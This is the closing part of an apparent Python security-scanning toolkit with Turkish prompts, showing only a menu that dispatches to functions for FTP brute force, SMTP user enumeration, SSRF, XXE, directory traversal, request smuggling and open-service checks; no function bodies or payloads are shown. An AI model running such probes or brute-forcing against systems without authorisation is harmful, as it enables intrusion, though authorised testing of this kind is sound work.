            robots_deep_scan(url)
        elif choice_num == 26:
            url = input("URL: ").strip()
            waf_detection(url)
        elif choice_num == 27:
            domain = input("Domain: ").strip()
            ssl_certificate_info(domain)
        elif choice_num == 28:
            url = input("URL: ").strip()
            http_methods_enum(url)
        elif choice_num == 29:
            url = input("URL: ").strip()
            directory_listing_check(url)
        elif choice_num == 30:
            network = input("IP Network (örnek 192.168.1.0/24): ").strip()
            ping_sweep(network)
        elif choice_num == 31:
            target = input("FTP sunucu IP: ").strip()
            user = input("Kullanıcı adı: ").strip()
            passfile = input("Şifre listesi dosyası: ").strip()
            ftp_bruteforce(target, user, passfile)
        elif choice_num == 32:
            target = input("SMTP sunucu IP: ").strip()
            email = input("Email adresi: ").strip()
            smtp_email_enum(target, email)
        elif choice_num == 33:
            domain = input("Domain: ").strip()
            dns_cache_snooping(domain)
        elif choice_num == 34:
            url = input("URL: ").strip()
            extract_emails(url)
        elif choice_num == 35:
            url = input("URL: ").strip()
            robots_txt_parser(url)
        elif choice_num == 36:
            url = input("URL: ").strip()
            param = input("Parametre adı: ").strip()
            open_redirect_check(url, param)
        elif choice_num == 37:
            url = input("URL: ").strip()
            param = input("Parametre adı: ").strip()
            directory_traversal_check(url, param)
        elif choice_num == 38:
            url = input("URL: ").strip()
            basic_auth_check(url)
        elif choice_num == 39:
            domain = input("Domain: ").strip()
            ssl_labs_test(domain)
        elif choice_num == 40:
            url = input("URL: ").strip()
            http_request_smuggling_test(url)
        elif choice_num == 41:
            url = input("URL: ").strip()
            clickjacking_check(url)
        elif choice_num == 42:
            url = input("URL: ").strip()
            cors_misconfig_check(url)
        elif choice_num == 43:
            token = input("JWT Token: ").strip()
            jwt_decode(token)
        elif choice_num == 44:
            url = input("URL: ").strip()
            insecure_cookies_check(url)
        elif choice_num == 45:
            url = input("URL: ").strip()
            param = input("Parametre adı: ").strip()
            ssrf_test(url, param)
        elif choice_num == 46:
            target = input("Hedef IP: ").strip()
            port = input("Port (default 21): ").strip()
            port = int(port) if port else 21
            open_ftp_proxy_check(target, port)
        elif choice_num == 47:
            url = input("URL: ").strip()
            param = input("Parametre adı: ").strip()
            xxe_test(url, param)
        elif choice_num == 48:
            target = input("Hedef IP: ").strip()
            port = input("Port (default 27017): ").strip()
            port = int(port) if port else 27017
            open_mongodb_check(target, port)
        elif choice_num == 49:
            target = input("Hedef IP: ").strip()
            port = input("Port (default 123): ").strip()
            port = int(port) if port else 123
            open_ntp_server_check(target, port)
        elif choice_num == 50:
            target = input("Hedef IP: ").strip()
            port = input("Port (default 6379): ").strip()
            port = int(port) if port else 6379
            open_redis_check(target, port)
        else:
            print(Fore.RED + "Geçersiz seçim!")

if __name__ == "__main__":
    main()
